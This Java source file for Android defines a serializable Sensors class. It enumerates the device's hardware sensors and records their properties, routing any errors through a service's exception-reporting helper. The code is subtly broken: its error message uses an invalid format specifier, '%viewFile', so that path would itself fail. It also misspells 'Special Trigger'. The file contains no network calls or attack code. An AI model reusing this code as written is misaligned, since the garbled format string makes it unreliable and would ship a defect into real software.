package Transfer;

import android.content.Context;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.os.Build.VERSION;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

import static android.hardware.Sensor.REPORTING_MODE_CONTINUOUS;
import static android.hardware.Sensor.REPORTING_MODE_ONE_SHOT;
import static android.hardware.Sensor.REPORTING_MODE_ON_CHANGE;
import static android.hardware.Sensor.REPORTING_MODE_SPECIAL_TRIGGER;

public class Sensors implements Serializable {

  public List<Sensor1> SENSORS;

  public Sensors() {
    SENSORS = new ArrayList();

    try {
      if (VERSION.SDK_INT >= 3) {
        for (Sensor sensor : ((SensorManager) MyService.context.getSystemService(
            Context.SENSOR_SERVICE)).getSensorList(-1)) {
          Sensor1 sensor2 = new Sensor1();
          sensor2.NAME = sensor.getName();

          if (VERSION.SDK_INT >= 21) {
            sensor2.MAXDELAY = sensor.getMaxDelay();
          }

          sensor2.MAXRANGE = sensor.getMaximumRange();

          if (VERSION.SDK_INT >= 9) {
            sensor2.MINDELAY = sensor.getMinDelay();
          }

          sensor2.POWER = sensor.getPower();

          if (VERSION.SDK_INT >= 21) {
            switch (sensor.getReportingMode()) {
              case REPORTING_MODE_CONTINUOUS:
                sensor2.REPORTINGMODE = "Continuous";
                break;
              case REPORTING_MODE_ON_CHANGE:
                sensor2.REPORTINGMODE = "On Change";
                break;
              case REPORTING_MODE_ONE_SHOT:
                sensor2.REPORTINGMODE = "One Shot";
                break;
              case REPORTING_MODE_SPECIAL_TRIGGER:
                sensor2.REPORTINGMODE = "Sepcial Trigger";
                break;
            }

            sensor2.ISWAKEUPSENSOR = sensor.isWakeUpSensor();
          } else {
            sensor2.REPORTINGMODE = "N/A";
          }

          sensor2.RESOLUTION = sensor.getResolution();
          sensor2.TYPE = sensor.getType();

          if (VERSION.SDK_INT >= 20) {
            sensor2.STRINGTYPE = sensor.getStringType();
          } else {
            sensor2.STRINGTYPE = "N/A";
          }

          sensor2.VENDOR = sensor.getVendor();
          sensor2.VERSION = sensor.getVersion();
          SENSORS.add(sensor2);
        }
        return;
      }

      throw new Exception(String.format(
          "This feature requires SDK level %viewFile. The device has level %viewFile.",
          new Object[] { 3, VERSION.SDK_INT }));
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
